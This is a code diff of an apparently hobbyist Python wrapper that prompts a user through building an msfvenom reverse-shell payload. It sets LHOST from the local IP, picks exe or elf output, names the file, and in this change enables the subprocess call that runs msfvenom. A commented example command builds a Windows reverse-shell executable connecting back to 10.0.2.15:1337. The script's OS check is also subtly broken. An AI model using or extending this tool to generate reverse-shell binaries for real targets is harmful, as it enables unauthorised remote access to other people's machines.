@@ -99,12 +99,17 @@ def createPayload():
   print(Fore.GREEN + "linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell")
   print("linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6")
   print()
+  global arg_two
   arg_two = input(Fore.WHITE + "Command Line: ")
   if arg_two == "REDO":
     createPayload()
 
 def  Lportnhost():
   global finalPacket
+  global ip_address
+  global lPort
+  global arg_three
+  global arg_four
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   #Find Local Host Automation
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -150,11 +155,15 @@ def  Lportnhost():
   while target == 1:
 
     if typeOfMachine == "windows" or "Windows":
-      finalPacket += ( " -f exe")
+      arg_three = '-f'
+      arg_four = 'exe'
+      # finalPacket += ( " -f exe")
       target = 0
 
-    elif typeOfMachine == "linux" or "Linux":
-      finalPacket += ( " -f elf")
+    if typeOfMachine == "linux" or "Linux":
+      arg_three = '-f'
+      arg_four = 'elf'
+      # finalPacket += ( " -f elf")
       target = 0
       
     else:
@@ -165,14 +174,17 @@ def  Lportnhost():
       OS = input(Fore.WHITE + "Command Line: ")
     
 def finlization():
+  global arg_five
+  global arg_six
   global finalPacket
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   #Type of payload and naming payload
   print(Fore.RED + "   Question 6: Lastly what would you like to name your packet? ")
   print()
   OS = input(Fore.WHITE + "Command Line: ")
-  namePacket = OS
-  finalPacket += ( " -o " + str(namePacket))
+  arg_five = OS
+  arg_six = '-o'
+  # finalPacket += ( " -o " + str(namePacket))
 
  
 
@@ -189,8 +201,9 @@ os.system('cls' if os.name == 'nt' else "printf '\033c'")
 print(Fore.GREEN + finalPacket)
 # packet_call = str("'"+str(finalPacket.replace(" ","','"))+"'")
 # # print (packet_call)
-# return_code = subprocess.call([packet_call])
-# print("output:", return_code)
+print(program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five)
+return_code = subprocess.call([program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five])
+print("output:", return_code)
 # # return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
 # # print("output:", return_code)
 
